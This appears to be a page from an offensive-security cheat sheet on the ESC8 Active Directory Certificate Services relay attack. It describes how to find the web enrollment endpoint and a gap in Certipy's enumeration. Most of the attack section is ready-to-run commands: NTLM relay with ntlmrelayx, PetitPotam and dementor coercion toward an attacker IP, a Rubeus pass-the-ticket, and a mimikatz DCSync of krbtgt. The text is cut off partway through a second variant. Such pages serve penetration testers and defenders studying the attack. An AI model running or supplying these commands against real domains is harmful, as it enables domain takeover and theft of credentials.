# Active Directory - Certificate ESC8 - Internal All The Things
URL: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-esc08/

Active Directory - Certificate ESC8 - Internal All The Things

## Web Enrollment Endpoint

Probe the endpoint by sending a request to:

```
http://<webserver-ip>/certsrv/certfnsp.aspx

```

A valid enrollment endpoint will respond with NTLM/Negotiate authentication headers (`WWW-Authenticate`).

The Web Enrollment role does not need to run on the CA itself; it can be hosted on any IIS server configured for delegation to the target CA.

In high-traffic environments, Web Enrollment is commonly deployed on a dedicated IIS server to offload traffic from the CA.

> When CA Web Enrollment is installed on a non-CA server, that server acts as an enrollment registration authority. The target CA is selected by CA name or computer name. — Microsoft Docs

### Certipy Blind Spot

Certipy does not enumerate Web Enrollment on remote IIS servers. It only inspects the CA host. It also does not verify whether a delegated Web Enrollment server is bound to the CA.

```
Web Enrollment
    HTTP
        Enabled: False
    HTTPS
        Enabled: False

```

> `False` on both means the CA host is not running Web Enrollment but a separate IIS server may still expose it.

## ESC8 - Web Enrollment Relay

> An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.

Require SecureAuthCorp/impacket PR #1101

- Version 1: NTLM Relay + Rubeus + PetitPotam

```
impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
# For a member server or workstation, the template would be "Computer".
# Other templates: workstation, DomainController, Machine, KerberosAuthentication

# Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam 
# You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local

# Use the certificate with rubeus to request a TGT
Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt

# Now you can use the TGT to perform a DCSync
mimikatz> lsadump::dcsync /user:krbtgt

```

- Version 2: NTLM Relay + Mimikatz + Kekeo

```
impacket> python3 ./examples/ntlmrelayx.py -t http://1